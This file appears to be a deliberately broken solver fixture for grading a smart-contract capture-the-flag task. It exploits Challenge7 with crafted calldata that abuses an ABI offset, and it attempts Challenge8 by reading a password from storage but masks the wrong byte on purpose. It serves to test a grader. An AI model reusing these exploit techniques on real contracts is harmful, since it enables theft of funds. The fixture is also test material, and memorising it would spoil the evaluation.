#!/usr/bin/env python3
"""Broken fixture: captures flags 1 and 7, but on Challenge8 masks the WRONG
byte (clears the least-significant byte instead of the most-significant one
the count-0 mask actually clears).

Expected: only flag8 fails. Score 50.
"""
import json
import subprocess
import sys
from pathlib import Path


def cast(*a):
    p = subprocess.run(["cast", *a], capture_output=True, text=True, timeout=120)
    if p.returncode != 0:
        sys.exit(f"cast failed: {p.stderr[:200]}")
    return p.stdout.strip()


def send(rpc, key, to, *args, value=None):
    cmd = ["send", "--rpc-url", rpc, "--private-key", key, to, *args]
    if value is not None:
        cmd += ["--value", str(value)]
    return cast(*cmd)


def main():
    p = json.loads(Path("params.json").read_text())
    rpc = p["rpc_url"]
    key = Path(p["key_file"]).read_text().strip()
    send(rpc, key, p["challenge1"], "registerTeam(string,uint8)", "team", "1")

    # flag 7 (correct)
    mint_sel = cast("sig", "mint(bytes)")[2:]
    allow_sel = cast("sig", "allowMinter()")[2:]
    mf_sel = cast("sig", "mintFlag()")[2:]
    calldata = ("0x" + mint_sel + f"{0x60:064x}" + "00" * 32
                + mf_sel + "00" * 28 + f"{4:064x}" + allow_sel + "00" * 28)
    send(rpc, key, p["challenge7"], calldata)
    send(rpc, key, p["challenge7"], "mint(bytes)", "0x" + mf_sel)

    # flag 8 with the WRONG mask (clears LSB)
    stored = cast("storage", "--rpc-url", rpc, p["challenge8"], "1")
    wrong = "0x%064x" % (int(stored, 16) & ~0xFF)
    Path("src/H8.sol").write_text("""//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;
interface IC8 { function mintFlag(bytes32) external payable; }
contract H8 {
    address c;
    constructor(address _c) { c = _c; }
    function go(bytes32 pw) external payable { IC8(c).mintFlag{value: 2}(pw); }
    receive() external payable { require(msg.value != 1, "no1"); }
}
""")
    subprocess.run(["forge", "build"], capture_output=True, text=True)
    code = json.loads(Path("out/H8.sol/H8.json").read_text())["bytecode"]["object"]
    h8 = json.loads(cast("send", "--rpc-url", rpc, "--private-key", key, "--create",
                         code + p["challenge8"].lower().replace("0x", "").rjust(64, "0"),
                         "--json"))["contractAddress"]
    send(rpc, key, h8, value=1000)
    # this reverts (wrong password); swallow so the script exits 0
    subprocess.run(["cast", "send", "--rpc-url", rpc, "--private-key", key, h8,
                    "go(bytes32)", wrong], capture_output=True, text=True)
    print("flags 1 and 7, flag 8 wrong mask")


if __name__ == "__main__":
    main()
